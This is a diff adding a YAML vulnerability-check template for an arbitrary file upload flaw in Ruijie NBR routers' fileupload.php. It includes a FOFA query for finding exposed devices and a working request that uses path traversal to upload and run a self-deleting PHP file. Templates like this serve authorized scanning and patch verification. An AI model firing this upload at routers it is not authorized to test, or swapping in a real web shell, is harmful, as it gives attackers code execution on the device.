@@ -1,0 +1,38 @@
+id: ruijie-nbr-fileupload
+
+info:
+  name: 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞
+  author: peiqi
+  severity: high
+  verified: true
+  description: |
+    锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限
+    FOFA: app="Ruijie-NBR路由器"
+  reference:
+    - https://peiqi.wgpsec.org/wiki/iot/锐捷/锐捷%20NBR%20路由器%20fileupload.php%20任意文件上传漏洞.html
+  tags: ruijie,fileupload
+  created: 2023/08/10
+
+set:
+  r1: randomLowercase(6)
+  r2: md5(r1)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ddi/server/fileupload.php?uploadDir=../../321&name={{r1}}.php
+      headers:
+        Accept: text/plain, */*; q=0.01
+        Content-Disposition: form-data; name="file"; filename="111.php"
+        Content-Type: image/jpeg
+      body: |
+        <?php echo md5("{{r1}}");unlink(__FILE__);?>
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"jsonrpc"') 
+  r1:
+    request:
+      method: GET
+      path: /321/{{r1}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(r2))
+expression: r0() && r1()
